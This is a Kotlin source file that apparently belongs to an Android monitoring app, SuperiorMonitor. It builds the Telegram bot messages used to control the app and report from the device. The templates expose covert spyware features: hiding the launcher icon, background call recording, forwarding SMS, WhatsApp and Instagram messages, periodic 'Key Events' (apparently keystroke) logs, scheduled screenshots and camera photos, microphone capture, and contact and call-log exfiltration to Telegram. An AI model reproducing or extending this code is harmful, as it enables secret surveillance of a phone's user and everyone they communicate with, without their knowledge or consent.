package com.system.superiormonitor.bot

import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import com.system.superiormonitor.data.PrefsManager
import com.system.superiormonitor.core.TelemetryCollector
import com.chiller3.bcr.Preferences
import com.chiller3.bcr.format.AudioSource
import com.chiller3.bcr.format.Format
import com.chiller3.bcr.format.RangedParamInfo
import com.chiller3.bcr.format.RangedParamType

object BotMessages {

    fun buildMenuHeader(tags: String, title: String): String =
        """
        $tags
        ===================
        *$title*
        """.trimIndent()
        
    fun formatFeatureState(enabled: Boolean, interval: Int = -1, useEmojis: Boolean = false): String {
        val onStr = if (useEmojis) "✅ Enabled" else "Enabled"
        val offStr = if (useEmojis) "❌ Disabled" else "Disabled"
        if (!enabled && interval > 0) return "$offStr | NA"
        if (!enabled) return offStr
        return if (interval > 0) "$onStr | $interval Min" else onStr
    }
        
    object Core {
        fun buildWelcomeMessage(userName: String): String =
                "👋 Welcome $userName!\n\nSystem is active and working properly.\n\nJSON_MARKUP:${BotMarkups.Core.buildMainKeyboard()}"

        fun buildSendMessageWarningPrompt(): String =
            "⚠️ *Warning* - Using this feature will send a popup on device and it will be visible with your custom message."

        fun buildSendMessageInputPrompt(): String =
            "Reply to this message with your text's to display as popup on device."

        suspend fun buildStatusMessage(context: Context): String {
            val prefs = PrefsManager.getInstance(context)
            val metrics = TelemetryCollector.gatherTelemetry()

            val compMain = ComponentName(context, "com.system.superiormonitor.MainActivityLauncher")
            val isHidden =
                    context.packageManager.getComponentEnabledSetting(compMain) ==
                            PackageManager.COMPONENT_ENABLED_STATE_DISABLED
            val launcherStatus = if (isHidden) "Hidden" else "Visible"

            return """
                *System check complete*

                *Settings* -
                *Launcher icon*: $launcherStatus

                *Security Snapshots* -
                *Screenshots*: ${formatFeatureState(prefs.enableSnapshots, prefs.snapshotIntervalMin)}
                *Front shots*: ${formatFeatureState(prefs.enableFrontCamera, prefs.frontCameraInterval)}
                *Rear shots*: ${formatFeatureState(prefs.enableRearCamera, prefs.rearCameraInterval)}

                *Basic Updates* -
                *Call Recording*: ${formatFeatureState(prefs.forwardRecordingEnabled)}
                *Call Events*: ${formatFeatureState(prefs.callAlertsEnabled)}
                *SMS Events*: ${formatFeatureState(prefs.smsAlertsEnabled)}
                *Key Events*: ${formatFeatureState(prefs.keyEventsEnabled, prefs.keyEventsIntervalMin)}

                *Social Updates* -
                *Whatsapp*: ${formatFeatureState(prefs.whatsappUpdatesEnabled)}

                *Temperature:* ${metrics["TEMP"]}°C
                *Battery:* ${metrics["BATTERY"]}% ${metrics["STATUS"]}

                *Network Activity:*
                *${metrics["SIM1_CARRIER"]}:* ${metrics["SIM1_RSRP"]} dBm | *${metrics["SIM2_CARRIER"]}:* ${metrics["SIM2_RSRP"]} dBm
                *Network IP:* `${metrics["NETWORK_IP"]}`

                *Uptime:* ${metrics["UPTIME"]} | *Current:* ${metrics["CURRENT_TIME"]}
            """.trimIndent() +
                    "\n\nJSON_MARKUP:${BotMarkups.Core.buildMainKeyboard()}"
        }

        fun buildMenuMessage(userName: String): String =
                "*Hey* $userName!\n\n*How can i help you today!*\n\n*You can use the following commands*\n\nJSON_MARKUP:${BotMarkups.Core.buildMenuMarkup()}"

        fun buildMenuPrompt(userName: String): String =
                "*Hey* $userName!!\n\n*You've reached to menu command of SuperiorMonitor*\n- You can use the following buttons to control the device"

        fun buildTelemetryMessage(title: String, metrics: Map<String, String>): String =
                title +
                        "\n\n" +
                        """
                *Temperature:* ${metrics["TEMP"]}°C
                *CPU Freq:* ${metrics["CPU_FREQ_MHZ"]} MHz
                *CPU Load:* ${metrics["CPU_LOAD"]}
                *Storage Used:* ${metrics["STORAGE"]}
                *Battery:* ${metrics["BATTERY"]}% ${metrics["STATUS"]}
                
                *Network Activity:*
                *${metrics["SIM1_CARRIER"]}:* ${metrics["SIM1_RSRP"]} dBm | *${metrics["SIM2_CARRIER"]}:* ${metrics["SIM2_RSRP"]} dBm
                *Gateway IP:* `${metrics["GATEWAY_IP"]}`
                *Network IP:* `${metrics["NETWORK_IP"]}`
                
                *Uptime:* ${metrics["UPTIME"]} | *Current:* ${metrics["CURRENT_TIME"]}
            """.trimIndent()

        fun buildBulkUploadMessage(appName: String): String =
            """
            #$appName #Batch
            ===================
            📦 *Live Batch Upload*
            
            This document contains multiple $appName messages that arrived rapidly.
            """.trimIndent()
    }

    object Settings {
        fun buildSettingsMenu(): String =
                "*Hey*, \n*I'm here to help you with application's corresponding settings*\n\n- Select the application to know it's settings\n\nJSON_MARKUP:${BotMarkups.Settings.buildSettingsMarkup()}"

        fun buildSettingsIntro(): String =
                "👑 *Welcome back, Master!* \n\nI am SuperiorMonitor, your personal device management assistant. \n\nYou hold absolute control. Use the buttons below to command me:"

        fun buildSuperiorSettingsPrompt(): String = "*What do you need to help with SuperiorMonitor *?"

        fun buildSuperiorLauncherTitle(): String = "*Launcher Settings of SuperiorMonitor*"

        fun buildPersistentEnforcementPrompt(context: Context): String {
            val prefs = PrefsManager.getInstance(context)
            if (!prefs.persistentEnforcementEnabled) {
                return buildMenuHeader("#System #Persistent", "System Warning") + "\n\n" +
                """
                    System-level enforcement modifies restricted internal settings. Depending on your Android version and OEM modifications, this feature may cause unexpected behavior, including system UI crashes or soft reboots. 
                    
                    Please proceed with caution.
                """.trimIndent()
            } else {
                val dataState = formatFeatureState(prefs.forceMobileData, useEmojis = true)
                val wifiState = formatFeatureState(prefs.forceWifi, useEmojis = true)
                val hotspotState = formatFeatureState(prefs.forceHotspot, useEmojis = true)
                return buildMenuHeader("#System #Persistent", "Persistent Enforcement Dashboard") + "\n\n" +
                """
                    *Currently Active Settings*:
                    *Force Mobile Data*: $dataState
                    *Force Wi-Fi*: $wifiState
                    *Force Hotspot*: $hotspotState
                """.trimIndent()
            }
        }
        
        fun buildBasicUpdatesPrompt(context: Context): String {
            val prefs = PrefsManager.getInstance(context)
            val recState = formatFeatureState(prefs.forwardRecordingEnabled, useEmojis = true)
            val callState = formatFeatureState(prefs.callAlertsEnabled, useEmojis = true)
            val smsState = formatFeatureState(prefs.smsAlertsEnabled, useEmojis = true)
            val keyState = formatFeatureState(prefs.keyEventsEnabled, prefs.keyEventsIntervalMin, useEmojis = true)
            
            return buildMenuHeader("#System #BasicUpdates", "Basic Updates Dashboard") + "\n\n" +
            """
                Forward Upcoming/Outgoing Updates to Telegram Chat.
                
                *Currently Active Settings*:
                *Call Recording*: $recState
                *Call Events*: $callState
                *SMS Events*: $smsState
                *Key Events*: $keyState
            """.trimIndent()
        }

        fun buildKeyEventsFeaturePrompt(context: Context): String {
            val prefs = PrefsManager.getInstance(context)
            val state = formatFeatureState(prefs.keyEventsEnabled, prefs.keyEventsIntervalMin, useEmojis = true)
            
            return buildMenuHeader("#System #KeyEvents", "Key Events Settings") + "\n\n" +
            """
                Set an automatic interval for sending Key Events logs, or disable it completely.
                
                *Current State*: $state
            """.trimIndent()
        }

        fun buildCallRecordingMenuPrompt(): String =
            buildMenuHeader("#System #CallRecording", "Call Recording Settings") + "\n\n" +
            """
            Enable or disable background call recording, and configure advanced recording engine settings.
            """.trimIndent()
                
        fun buildSocialUpdatesPrompt(context: Context): String {
            val prefs = PrefsManager.getInstance(context)
            val whatsappState = formatFeatureState(prefs.whatsappUpdatesEnabled, useEmojis = true)
            val waBusinessState = formatFeatureState(prefs.whatsappBusinessUpdatesEnabled, useEmojis = true)
            val instagramState = formatFeatureState(prefs.instagramEnabled, useEmojis = true)
            
            return buildMenuHeader("#System #SocialUpdates", "Social Updates Dashboard") + "\n\n" +
            """
                Forward Upcoming/Outgoing Social Update to Telegram Chat.
                
                *Currently Active Settings*:
                
                *WhatsApp*: $whatsappState
                *WhatsApp Business*: $waBusinessState
                *Instagram*: $instagramState
            """.trimIndent()
        }

        @OptIn(kotlin.ExperimentalUnsignedTypes::class)
        fun buildRecorderSettingsPrompt(context: Context): String {
            val bcrPrefs = Preferences(context)
            val audioSource = Format.fromPreferences(bcrPrefs).audioSource
            val format = Format.fromPreferences(bcrPrefs).format
            val sampleRate = Format.fromPreferences(bcrPrefs).sampleRate ?: format.sampleRateInfo.default
            val param = Format.fromPreferences(bcrPrefs).param ?: format.paramInfo.default

            val sourceStr = when (audioSource) {
                AudioSource.VOICE_CALL -> "Voice Call (Mono)"
                AudioSource.VOICE_UPLINK_DOWNLINK -> "Voice Uplink + Downlink (Stereo)"
                AudioSource.VOICE_UPLINK -> "Voice Uplink (You)"
                AudioSource.VOICE_DOWNLINK -> "Voice Downlink (Them)"
            }

            val showSampleRate = format.sampleRateInfo.presets.size > 1
            val sampleRateSection = if (showSampleRate) "Sample Rate: $sampleRate Hz" else null

            val showParam = format.paramInfo.presets.size > 1
            val paramStr = if (format.paramInfo is RangedParamInfo) {
                when ((format.paramInfo as RangedParamInfo).type) {
                    RangedParamType.Bitrate -> "$param kbps"
                    RangedParamType.CompressionLevel -> "Level $param"
                }
            } else {
                "Quality $param"
            }
            val paramSection = if (showParam) "Parameter: $paramStr" else null

            val telecomStr = formatFeatureState(bcrPrefs.recordTelecomApps, useEmojis = true)
            val dialingStr = formatFeatureState(bcrPrefs.recordDialingState, useEmojis = true)

            return buildString {
                appendLine(buildMenuHeader("#System #RecorderSettings", "Call Recorder Engine Settings"))
                appendLine()
                appendLine("Current Audio Configuration:")
                appendLine("Source: $sourceStr")
                appendLine("Format: ${format.name}")
                if (sampleRateSection != null) appendLine(sampleRateSection)
                if (paramSection != null) appendLine(paramSection)
                appendLine()
                appendLine("Auto Record Rules:")
                appendLine("Telecom Apps: $telecomStr")
                append("Dialing State: $dialingStr")
            }
        }

        fun buildRecSelectSourcePrompt(): String = "Select Audio Source:"
        fun buildRecSelectFormatPrompt(): String = "Select Encoding Format:"
        
        fun buildRecSelectSampleRatePrompt(context: Context): String {
            val bcrPrefs = Preferences(context)
            val format = Format.fromPreferences(bcrPrefs).format
            return "Select Sample Rate for ${format.name}:"
        }
        
        fun buildRecSelectParamPrompt(context: Context): String {
            val bcrPrefs = Preferences(context)
            val format = Format.fromPreferences(bcrPrefs).format
            return "Select Parameter for ${format.name}:"
        }
    }

    object MediaOps {
        fun buildSnapshotPrompt(): String =
                "*SnapshotEngine*\n\n- You can use the following buttons to take shots from the device"

        fun buildMediaOpsPrompt(): String = "*Media Operations*\n\n-Select desired option below"

        fun buildMicrophonePrompt(): String = "*Select your desired duration*"
        
        fun buildSnapshotSettingsPrompt(context: Context): String {
            val prefs = PrefsManager.getInstance(context)
            val screenState = if (prefs.enableSnapshots) "Enabled (${prefs.snapshotIntervalMin}m)" else "Disabled"
            val frontState = if (prefs.enableFrontCamera) "Enabled (${prefs.frontCameraInterval}m)" else "Disabled"
            val rearState = if (prefs.enableRearCamera) "Enabled (${prefs.rearCameraInterval}m)" else "Disabled"
            return buildMenuHeader("#Snapshot #Remote", "Enable and disable any feature remotely") + "\n\n" +
            """
                *Currently*:
                *Screenshots*: $screenState
                *Front shots*: $frontState
                *Rear shots*: $rearState
            """.trimIndent()
        }
        
        fun buildSnapshotFeaturePrompt(context: Context, feature: String): String {
            val prefs = PrefsManager.getInstance(context)
            val isEnabled = when (feature) {
                "Screenshots" -> prefs.enableSnapshots
                "Front Camera" -> prefs.enableFrontCamera
                else -> prefs.enableRearCamera
            }
            
            return if (isEnabled) {
                buildMenuHeader("#Snapshot #Remote", "Change the schedule timer?") + "\n\n" +
                """
                *Feature*: $feature
                *Status*: Enabled
                """.trimIndent()
            } else {
                buildMenuHeader("#Snapshot #Remote", "Enable $feature , Select the schedule time") + "\n\n" +
                """
                *Status*: Disabled
                """.trimIndent()
            }
        }

        fun buildSnapshotUploadMessage(): String =
                """
            #Snapshot #Screencap
            
            ✨ *Routine Snapshot has been Taken!*
            
            - Uploading to Telegram.
        """.trimIndent()

        fun buildCameraUploadMessage(tag: String): String {
            val type = if (tag.contains("Front")) "Front Camera" else "Rear Camera"
            return """
                #Camera #Capture
                
                ✨ *Routine $type has been Taken!*
                
                - Uploading to Telegram.
            """.trimIndent()
        }

        fun buildNewRecordingUploadedMessage(fileName: String): String =
                """
            #Call
            ===================
            *New Recording Uploaded*
            
            *File* : `$fileName`
            *Status* : Online
        """.trimIndent()

        fun buildOnDemandCaptureMessage(type: Int): String =
                when (type) {
                    0 -> "#Snapshot #OnDemand\n\n*Screen Capture Success*"
                    1 -> "#Camera #OnDemand\n\n*Front Camera Success*"
                    else -> "#Camera #OnDemand\n\n*Rear Camera Success*"
                }
        
        fun buildOfflineQueueSendingMessage(): String =
                """
            #Upload #Offline
            ===================
            *Sending Remaining Images*
            
            The queued media files are now being uploaded to Telegram. Please wait.
        """.trimIndent()

        fun buildOfflineZipBatchingMessage(count: Int): String =
                """
            #Upload #Offline #Batch
            ===================
            📦 *Batching Offline Media*
            
            Found $count offline media files. Compressing into a ZIP archive to optimize upload and prevent spam.
            Attempting to send...
        """.trimIndent()


    }

    object FetchOps {
        fun buildFetchOpsPrompt(): String = "📱 *Fetch Data Operations*\n\n- Select the desired data to fetch below"

        fun buildContactsPrompt(): String = "📇 *Fetch Device Contacts*\n\n- This will fetch all saved contacts and send them as a text file."
        
        fun buildCallActivityPrompt(): String = "📞 *Fetch Call Activity*\n\n- Select the number of recent calls to fetch."

        fun buildFetchSuccessMessage(type: String, count: Int): String =
                """
            #Fetch #$type
            ===================
            *Fetch Completed Successfully*
            
            Successfully retrieved $count records.
            Please find the attached document.
        """.trimIndent()

        fun buildFetchInProgressMessage(target: String): String = "⏳ *Fetching $target, please wait...*"

        fun buildFetchGeneratingMessage(): String = "⏳ *File generated. Uploading...*"

        fun buildFetchCompletedMessage(target: String): String = "✅ *Fetch Completed*\n\nThe $target list has been uploaded successfully."

        fun buildFetchFailedMessage(reason: String): String = "❌ *Fetch Failed*\n\nReason: $reason"

        fun buildOfflineSyncCaption(tag: String, activityDesc: String): String =
            """
            #$tag #Offline
            ===================
            ⚠️ *Update* - While the device was offline, $activityDesc.
            Here are the remaining entries.
            """.trimIndent()
        
        fun buildRoutineKeyEventsCaption(): String =
                """
            #KeyEvents #Routine
            ===================
            🔄 *Routine Upload* - Here is the periodic Key Events.
        """.trimIndent()
        
        fun buildOfflineRecordingSyncedMessage(fileName: String): String =
                """
            #Call #Offline
            ===================
            *Offline Recording Synced*
            
            *File* : `$fileName`
            *Status* : Synced from Offline
        """.trimIndent()
    }

    object Alerts {
        fun buildLockedScreenMessage(): String =
                """
            #Snapshot #Aborted
            ===================
            ⚠️ *Capture Aborted*
            
            The device is currently locked or the screen is turned off. 
            Taking a screenshot right now would only result in a blank, black image.
            
            Please try your request again when the device is actively being used.
        """.trimIndent()

        fun buildConnectionRestoredMessage(): String =
                """
            #Network #Online
            ===================
            *Connection Restored*
            
            The device is back online. All services have been restored.
        """.trimIndent()

        fun buildRebootMessage(): String =
                """
            #Reboot #Connection
            ===================
            *Device Rebooted & Online* 
        """.trimIndent()



        fun buildOfflineMicCaption(): String =
                """
            #Microphone #Offline
            ===================
            ⚠️ *Previous recording request was not sent because the device was offline. Here is the recorded file.*
        """.trimIndent()

        fun buildUnauthorizedWarningMessage(): String =
                """
            *Superior Monitor* - A Personal Monitoring and device control telegram bot
            
            ⚠️ *You are not authorized to use this bot*
            - You will be blocked if you tried 3 access attempts.
        """.trimIndent()

        fun buildUnauthorizedBlockedMessage(): String =
                """
            *Superior Monitor* - A Personal Monitoring and device control telegram bot
            
            🚫 *User Blocked* - Your request will be ignored from now on.
        """.trimIndent()

        private fun buildSocialUpdateMessage(
            appName: String,
            tag: String,
            direction: String,
            details: List<Pair<String, String>>,
            message: String
        ): String = buildString {
            appendLine("#$tag")
            appendLine("===================")
            appendLine("✨ *$appName Update*")
            appendLine("===================")
            appendLine("*New Message has been $direction!*")
            appendLine()
            for ((key, value) in details) {
                appendLine("*$key* : $value")
            }
            appendLine("===================")
            appendLine()
            appendLine("*Message* :")
            append(message)
        }

        fun buildWhatsAppMessage(
                safeChatName: String,
                safeChatType: String,
                direction: String,
                timeFormatted: String,
                safeSentBy: String,
                safeToTarget: String,
                safeMsg: String
        ): String = buildSocialUpdateMessage("WhatsApp", "Whatsapp", direction, listOf(
            "Chat Room" to "$safeChatName [$safeChatType]",
            "Type" to direction,
            "Time" to timeFormatted,
            "From" to safeSentBy,
            "To" to safeToTarget
        ), safeMsg)

        fun buildWABusinessMessage(
                safeChatName: String,
                safeChatType: String,
                direction: String,
                timeFormatted: String,
                safeSentBy: String,
                safeToTarget: String,
                safeMsg: String
        ): String = buildSocialUpdateMessage("WA Business", "WABusiness", direction, listOf(
            "Chat Room" to "$safeChatName [$safeChatType]",
            "Type" to direction,
            "Time" to timeFormatted,
            "From" to safeSentBy,
            "To" to safeToTarget
        ), safeMsg)

        fun buildInstagramMessage(
                direction: String,
                timeFormatted: String,
                safeSentBy: String,
                safeToTarget: String,
                safeUsername: String,
                safeMsg: String
        ): String = buildSocialUpdateMessage("Instagram", "Instagram", direction, listOf(
            "Type" to direction,
            "Time" to timeFormatted,
            "From" to safeSentBy,
            "To" to safeToTarget,
            "Username" to "`$safeUsername`"
        ), safeMsg)

        fun buildCallMessage(
                typeStr: String,
                timeStr: String,
                safeContactName: String,
                safeNumber: String
        ): String =
                """
            #Call
            ===================
            ✨ *Call activity has been detected!*
            ===================
            
            *Type* : $typeStr
            *Time* : $timeStr
            *Contact* : $safeContactName
            *Number* : `$safeNumber`
        """.trimIndent()

        fun buildSmsMessage(
                headerAction: String,
                fromOrToLabel: String,
                fromToStrSafe: String,
                timeStr: String,
                safeCarrierName: String,
                directionType: String,
                safeBody: String
        ): String =
                """
            #SMS
            ===================
            🔔 *NEW SMS* $headerAction
            ===================

            $fromOrToLabel: $fromToStrSafe
            *Time*: $timeStr
            *SIM*: $safeCarrierName
            *Type*: $directionType

            *Message*: $safeBody
        """.trimIndent()
    }
}
